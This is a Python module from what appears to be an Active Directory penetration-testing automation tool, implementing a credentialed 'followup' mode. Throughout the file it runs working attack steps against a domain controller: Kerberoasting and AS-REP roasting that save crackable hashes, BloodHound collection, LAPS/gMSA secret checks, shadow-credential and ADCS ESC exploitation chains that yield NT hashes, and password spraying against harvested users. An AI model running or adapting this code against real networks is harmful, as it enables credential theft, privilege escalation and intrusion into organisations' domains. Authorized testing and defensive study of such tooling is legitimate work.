"""
followup.py — --mode followup

Runs credentialed enumeration without any nmap scanning.  Each credential pair
gets its own findings file (findings_<username>.md) and loot directory
(loot/<username>/).  BloodHound output goes to the shared loot/bloodhound/.

Entry point: run_followup_mode()
"""

from __future__ import annotations

import re
from pathlib import Path

from lib.findings import Findings, ServiceBuffer
from lib.models import Service
from lib.runner import Runner
from lib.workspace import Workspace

from lib.credsmode import (
    _trim,
    _has_signal,
    _error_lines,
    _sync_time,
    _validate_smb,
    _pth_verify,
    _parse_ldapdomaindump_users,
    _parse_adcs_find,
    _EXPLOITABLE_ESC,
    _adcs_esc_chain,
    _parse_nosec_templates,
    _check_laps,
    _check_gmsa,
    _bloodyad_writable,
    _shadow_creds_chain,
    _esc9_chain,
    _creds_smb,
    _creds_winrm,
    _creds_ssh,
    _creds_ftp,
    _creds_mssql,
    _creds_rdp,
    _creds_mysql,
    _creds_postgres,
    _creds_redis,
    _spray_password,
    _SERVICE_HANDLERS,
    _NAME_HANDLERS,
)


def _followup_ad_core(
    ip: str,
    domain: str,
    user: str,
    pw: str,
    runner: Runner,
    findings: Findings,
    ws: Workspace,
    user_dir: Path,
    available: set[str],
) -> list[tuple[str, str]]:
    """AD core enumeration with per-user loot dirs and runner-cache label namespacing.

    Returns list of (user, nt_hash) pairs produced by shadow-creds/ADCS chains,
    for use in PTH verification after the function returns.
    """
    safe = re.sub(r"[^a-z0-9]", "_", user.lower())
    pfx = f"followup_{safe}_"

    findings.h3("AD Core Enumeration")

    # 0. Time sync — Kerberos requires clock skew < 5 minutes vs DC
    _sync_time(ip, runner, findings, available)

    # 1. ldapdomaindump → user_dir/ldapdomaindump/
    if "ldapdomaindump" in available:
        dump_dir = user_dir / "ldapdomaindump"
        dump_dir.mkdir(parents=True, exist_ok=True)
        out_dir = str(dump_dir)
        cmd = [
            "ldapdomaindump",
            "-u", f"{domain}\\{user}",
            "-p", pw,
            "--no-grep",
            "-o", out_dir,
            f"ldap://{ip}",
        ]
        print(f"    [*] ldapdomaindump...")
        findings.h4("LDAP Domain Dump")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, f"{pfx}ldapdomaindump", timeout=120)
        errors = _error_lines(out)
        if errors:
            findings.code_block(errors)
            if "strongerAuthRequired" in out or "Could not bind" in out:
                cmd_ldaps = cmd[:-1] + [f"ldaps://{ip}"]
                findings.cmd(" ".join(cmd_ldaps))
                print(f"    [*] LDAP requires TLS — retrying with LDAPS...")
                out2 = runner.run(cmd_ldaps, f"{pfx}ldapdomaindump_ldaps", timeout=120)
                errors2 = _error_lines(out2)
                if errors2:
                    findings.code_block(errors2)
                    print(f"    [!] ldapdomaindump failed (LDAP + LDAPS)")
                else:
                    added = _parse_ldapdomaindump_users(out_dir, ws)
                    findings.bullet(f"Full dump → `loot/{user_dir.name}/ldapdomaindump/`")
                    if added:
                        findings.bullet(f"**{added} domain user(s)** extracted → `loot/users.txt`")
                        print(f"    [+] ldapdomaindump (LDAPS) — {added} users added")
        else:
            added = _parse_ldapdomaindump_users(out_dir, ws)
            findings.bullet(f"Full dump → `loot/{user_dir.name}/ldapdomaindump/`")
            if added:
                findings.bullet(f"**{added} domain user(s)** extracted → `loot/users.txt`")
                print(f"    [+] ldapdomaindump — {added} users added")

    # Show users.txt contents
    users_path = ws.loot_dir / "users.txt"
    if users_path.exists():
        user_lines = [l.strip() for l in users_path.read_text().splitlines() if l.strip()]
        for u in user_lines[:12]:
            print(f"        {u}")
        if len(user_lines) > 12:
            print(f"        ... ({len(user_lines) - 12} more in loot/users.txt)")

    # 2. Kerberoasting — hashes in user_dir AND appended to shared loot/kerberoast.hash
    if "impacket-GetUserSPNs" in available:
        hash_out = user_dir / "kerberoast.hash"
        cmd = [
            "impacket-GetUserSPNs",
            f"{domain}/{user}:{pw}",
            "-dc-ip", ip,
            "-request",
        ]
        print(f"    [*] Kerberoasting (GetUserSPNs)...")
        findings.h4("Kerberoasting (GetUserSPNs)")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, f"{pfx}getuserspns", timeout=60)
        hashes = [line for line in out.splitlines() if "$krb5tgs$" in line]
        spn_accounts = re.findall(r"^\S+/\S+\s+(\S+)\s", out, re.MULTILINE)
        if hashes:
            hash_out.write_text("\n".join(hashes) + "\n")
            added = ws.append_hash_file("kerberoast.hash", hashes)
            acct_str = f" — {', '.join(f'`{a}`' for a in spn_accounts)}" if spn_accounts else ""
            findings.bullet(
                f"**{len(hashes)} Kerberoastable hash(es)** ({added} new to shared) "
                f"→ `loot/{user_dir.name}/kerberoast.hash`{acct_str}"
            )
            findings.add_summary(f"{len(hashes)} Kerberoastable: {', '.join(spn_accounts) or 'unknown'} — hashcat -m 13100")
            print(f"    [+] {len(hashes)} Kerberoastable hashes → loot/{user_dir.name}/kerberoast.hash")
        else:
            if "error" in out.lower():
                findings.code_block(_trim(out))
            else:
                findings.bullet("No Kerberoastable SPNs found")
            print(f"    [-] No Kerberoastable SPNs")

    # 3. AS-REP roasting — hashes in user_dir AND appended to shared loot/asrep.hash
    if "impacket-GetNPUsers" in available:
        hash_out2 = user_dir / "asrep.hash"
        if users_path.exists() and users_path.stat().st_size > 0:
            cmd = [
                "impacket-GetNPUsers",
                f"{domain}/",
                "-dc-ip", ip,
                "-no-pass",
                "-request",
                "-usersfile", str(users_path),
            ]
        else:
            cmd = [
                "impacket-GetNPUsers",
                f"{domain}/{user}:{pw}",
                "-dc-ip", ip,
                "-request",
            ]
        print(f"    [*] AS-REP roasting (GetNPUsers)...")
        findings.h4("AS-REP Roasting (GetNPUsers)")
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, f"{pfx}getnpusers", timeout=60)
        hashes2 = [line for line in out.splitlines() if "$krb5asrep$" in line]
        if hashes2:
            hash_out2.write_text("\n".join(hashes2) + "\n")
            added2 = ws.append_hash_file("asrep.hash", hashes2)
            findings.bullet(
                f"**{len(hashes2)} AS-REP hash(es)** ({added2} new to shared) "
                f"→ `loot/{user_dir.name}/asrep.hash`"
            )
            findings.add_summary(f"{len(hashes2)} AS-REP roastable — hashcat -m 18200")
            print(f"    [+] {len(hashes2)} AS-REP hashes → loot/{user_dir.name}/asrep.hash")
        else:
            if "KRB5" in out or "error" in out.lower():
                findings.code_block(_trim(out))
            else:
                findings.bullet("No AS-REP roastable accounts found")
            print(f"    [-] No AS-REP roastable accounts")

    # 4. BloodHound — always writes to shared loot/bloodhound/
    if "bloodhound-python" in available:
        bh_dir = Path(ws.bloodhound_dir)
        bh_dir.mkdir(parents=True, exist_ok=True)
        findings.h4("BloodHound Collection")
        print(f"    [*] BloodHound collection...")

        def _bh_relocate() -> None:
            import re as _re
            pat = _re.compile(r"^\d{14}_\w+\.json$")
            for f in ws.loot_dir.iterdir():
                if f.is_file() and pat.match(f.name):
                    dest = bh_dir / f.name
                    if not dest.exists():
                        f.replace(dest)

        def _bh_find_zip(zip_name: str | None) -> "Path | None":
            search_dirs = [bh_dir, ws.loot_dir, ws.machine_dir]
            if zip_name:
                for d in search_dirs:
                    c = d / zip_name
                    if c.exists() and c.stat().st_size > 1000:
                        if c.parent != bh_dir:
                            dest = bh_dir / zip_name
                            c.replace(dest)
                            return dest
                        return c
            all_zips = sorted(
                (z for z in ws.machine_dir.rglob("*.zip") if z.stat().st_size > 1000),
                key=lambda z: z.stat().st_size, reverse=True,
            )
            if all_zips:
                z = all_zips[0]
                if z.parent != bh_dir:
                    dest = bh_dir / z.name
                    z.replace(dest)
                    return dest
                return z
            return None

        def _bh_run(collection: str, label: str) -> "Path | None":
            cmd_bh = [
                "bloodhound-python",
                "-c", collection,
                "-u", user,
                "-p", pw,
                "-d", domain,
                "--auth-method", "ntlm",
                "--dns-tcp",
                "--zip",
                "-o", str(bh_dir),
                "-ns", ip,
            ]
            findings.cmd(" ".join(cmd_bh))
            out_bh = runner.run(cmd_bh, label, timeout=300, cwd=str(bh_dir))
            _bh_relocate()
            m_zip = re.search(r"Compressing output into\s+(\S+\.zip)", out_bh)
            zip_name = Path(m_zip.group(1)).name if m_zip else None
            return _bh_find_zip(zip_name)

        zip_path = _bh_run("All", f"{pfx}bloodhound")
        if zip_path:
            findings.bullet(f"**BloodHound data** → `loot/bloodhound/{zip_path.name}`")
            findings.add_summary("BloodHound collection complete — import zip into BloodHound GUI")
            print(f"        [+] {zip_path.name}")
        else:
            print(f"        [-] All collection empty — retrying DCOnly...")
            zip_path = _bh_run("DCOnly", f"{pfx}bloodhound_dconly")
            if zip_path:
                findings.bullet(f"**BloodHound data (DCOnly)** → `loot/bloodhound/{zip_path.name}`")
                findings.add_summary("BloodHound DCOnly collection complete")
                print(f"        [+] {zip_path.name} (DCOnly)")
            else:
                findings.note("BloodHound collection produced no data — check LDAP connectivity and credentials")
                print(f"        [!] BloodHound collection failed")

    # 5. LAPS / gMSA — shared cache labels are acceptable (same target, same answer)
    if "nxc" in available:
        _check_laps(ip, domain, user, pw, runner, findings, ws, available)
        _check_gmsa(ip, domain, user, pw, runner, findings, ws, available)

    # 6. Writable AD objects
    writable_targets = _bloodyad_writable(ip, domain, user, pw, runner, findings, ws, available)

    # 7. Shadow credentials
    shadow_hashes: dict[str, str] = {}
    if writable_targets and "certipy-ad" in available:
        print(f"    [*] Shadow credentials against {len(writable_targets)} writable user(s)...")
        shadow_hashes = _shadow_creds_chain(
            ip, domain, user, pw, writable_targets, runner, findings, ws, available,
        )

    # 8. ADCS
    if "certipy-ad" in available:
        cmd_cert = [
            "certipy-ad", "find",
            "-u", f"{user}@{domain}",
            "-p", pw,
            "-dc-ip", ip,
            "-stdout",
            "-vulnerable",
        ]
        print(f"    [*] ADCS (certipy-ad)...")
        findings.h4("ADCS Templates (certipy-ad)")
        findings.cmd(" ".join(cmd_cert))
        out_cert = runner.run(cmd_cert, f"{pfx}certipy", timeout=120)
        findings.code_block(_trim(out_cert))

        vuln_templates = _parse_adcs_find(out_cert)
        exploitable = [(ca, tmpl, esc) for ca, tmpl, esc in vuln_templates if esc in _EXPLOITABLE_ESC]

        if vuln_templates:
            for ca_name, tmpl, esc in vuln_templates:
                findings.add_summary(f"ADCS {esc}: {tmpl} via {ca_name}")
            print(f"    [+] {len(vuln_templates)} vulnerable ADCS template(s) — {len(exploitable)} exploitable")
            for ca, tmpl, esc in exploitable:
                _adcs_esc_chain(ip, domain, user, pw, ca, tmpl, esc, runner, findings, ws, available)
            esc9_templates = [(ca, tmpl) for ca, tmpl, esc in vuln_templates if esc == "ESC9"]
            if esc9_templates and shadow_hashes:
                for ca, tmpl in esc9_templates:
                    for wu, wh in shadow_hashes.items():
                        _esc9_chain(ip, domain, user, pw, ca, tmpl, wu, wh, runner, findings, ws, available)
        elif re.search(r"Found \d+ enabled certificate template", out_cert):
            findings.note("No vulnerable templates via -vulnerable — running full enabled-template scan")
            cmd_full = [
                "certipy-ad", "find",
                "-u", f"{user}@{domain}",
                "-p", pw,
                "-dc-ip", ip,
                "-enabled",
                "-stdout",
                "-output", str(ws.loot_dir / "certipy_full"),
            ]
            print(f"    [*] ADCS fallback: full enabled-template scan...")
            findings.cmd(" ".join(cmd_full))
            out_full = runner.run(cmd_full, f"{pfx}certipy_enabled", timeout=120)
            findings.code_block(_trim(out_full))
            vuln_full = _parse_adcs_find(out_full)
            exploitable_full = [(ca, tmpl, esc) for ca, tmpl, esc in vuln_full if esc in _EXPLOITABLE_ESC]
            if vuln_full:
                for ca_name, tmpl, esc in vuln_full:
                    findings.add_summary(f"ADCS {esc}: {tmpl} via {ca_name}")
                for ca, tmpl, esc in exploitable_full:
                    _adcs_esc_chain(ip, domain, user, pw, ca, tmpl, esc, runner, findings, ws, available)
                esc9_full = [(ca, tmpl) for ca, tmpl, esc in vuln_full if esc == "ESC9"]
                if esc9_full and shadow_hashes:
                    for ca, tmpl in esc9_full:
                        for wu, wh in shadow_hashes.items():
                            _esc9_chain(ip, domain, user, pw, ca, tmpl, wu, wh, runner, findings, ws, available)
            else:
                nosec = _parse_nosec_templates(out_full)
                if nosec:
                    findings.note(
                        f"**{len(nosec)} ESC9 candidate(s)** with NoSecurityExtension + Client Auth: "
                        + ", ".join(f"`{t}`" for _, t in nosec)
                        + " — gain enrollment rights to exploit"
                    )
                else:
                    findings.note("Full ADCS output saved to `loot/certipy_full.json` — review manually")
        else:
            print(f"    [-] No vulnerable ADCS templates")

    return list(shadow_hashes.items())


def _followup_enum_services(
    ip: str,
    domain: str | None,
    user: str,
    pw: str,
    services: list[Service],
    runner: Runner,
    findings: Findings,
    ws: Workspace,
    user_dir: Path,
    available: set[str],
) -> None:
    """Run per-service credentialed checks, routing SMB loot to user_dir."""
    print(f"    [*] Per-service enumeration ({len(services)} service(s))...")
    for svc in services:
        if svc.proto != "tcp":
            continue

        kind: str | None = _SERVICE_HANDLERS.get(svc.port)
        if kind is None:
            svc_name = (svc.name or "").lower()
            for pat, k in _NAME_HANDLERS.items():
                if pat in svc_name:
                    kind = k
                    break
        if kind is None:
            continue

        buf = ServiceBuffer(svc.port, svc.proto)

        if kind == "smb":
            _creds_smb(ip, svc.port, domain, user, pw, runner, buf, ws, available, user_dir=user_dir)
        elif kind == "winrm":
            _creds_winrm(ip, svc.port, domain, user, pw, runner, buf, ws, available)
        elif kind == "ssh":
            _creds_ssh(ip, svc.port, domain, user, pw, runner, buf, ws, available)
        elif kind == "ftp":
            _creds_ftp(ip, svc.port, domain, user, pw, runner, buf, ws, available)
        elif kind == "mssql":
            _creds_mssql(ip, svc.port, domain, user, pw, runner, buf, ws, available)
        elif kind == "rdp":
            _creds_rdp(ip, svc.port, domain, user, pw, runner, buf, ws, available)
        elif kind == "mysql":
            _creds_mysql(ip, svc.port, user, pw, runner, buf, ws)
        elif kind == "postgres":
            _creds_postgres(ip, svc.port, user, pw, runner, buf, ws)
        elif kind == "redis":
            _creds_redis(ip, svc.port, pw, runner, buf, ws)

        findings.flush_service_buffer(buf)


def run_followup_mode(
    ip: str,
    domain: str | None,
    creds: list[tuple[str, str]],
    services: list[Service],
    runner: Runner,
    ws: Workspace,
    available: set[str],
) -> None:
    """Enumerate with each credential pair without overwriting any prior scan output.

    Per-user artifacts:
      loot/<username>/         — SMB spider files, hashes, ldapdomaindump
      findings_<username>.md   — separate findings file per user
      loot/bloodhound/         — shared BloodHound archives
    """
    if not creds:
        print("[!] Followup mode: no credentials provided")
        return

    print(f"\n[*] Followup mode — {len(creds)} credential set(s): {', '.join(u for u, _ in creds)}")

    for user, pw in creds:
        safe = re.sub(r"[^a-z0-9]", "_", user.lower())
        user_dir = ws.loot_dir / safe
        user_dir.mkdir(parents=True, exist_ok=True)

        findings_path = ws.machine_dir / f"findings_{safe}.md"
        findings = Findings(findings_path, ip, domain)

        print(f"\n{'='*60}")
        print(f"[*] Followup as {user}{'@' + domain if domain else ''}")
        print(f"    Findings  : {findings_path}")
        print(f"    Loot dir  : {user_dir}")
        print(f"{'='*60}")

        findings.h2(f"Followup Enumeration — {user}")
        label_prefix = f"followup_{safe}_"

        # 1. Validate credentials via SMB
        print(f"\n[*] Phase 1: SMB credential validation...")
        valid_smb, admin_smb = _validate_smb(ip, [(user, pw)], runner, findings, ws, available)
        if valid_smb:
            print(f"    [+] SMB: valid")
        else:
            print(f"    [-] SMB: authentication failed")

        # 2. AD core (domain-dependent)
        if domain:
            print(f"\n[*] Phase 2: AD core as {user}@{domain}...")
            _followup_ad_core(ip, domain, user, pw, runner, findings, ws, user_dir, available)
        else:
            findings.note("No domain configured — skipping AD core (kerberoast, BloodHound, ADCS)")
            print("[!] No domain — skipping AD core")

        # 3. Per-service enum
        print(f"\n[*] Phase 3: Per-service enumeration...")
        _followup_enum_services(
            ip, domain, user, pw, services, runner, findings, ws, user_dir, available,
        )

        # 4. Password spray — spray this user's password against other known users
        users_file = ws.loot_dir / "users.txt"
        if users_file.exists() and users_file.stat().st_size > 0:
            print(f"\n[*] Phase 4: Password spray as {user}...")
            findings.h2("Password Spray")
            _spray_password(
                ip, pw, user, runner, findings, ws, services, available,
                label_prefix=label_prefix,
            )

        findings.finalize()
        print(f"\n[+] {user} complete — {findings_path}")

    print(f"\n[+] Followup mode complete — {len(creds)} user(s) processed")
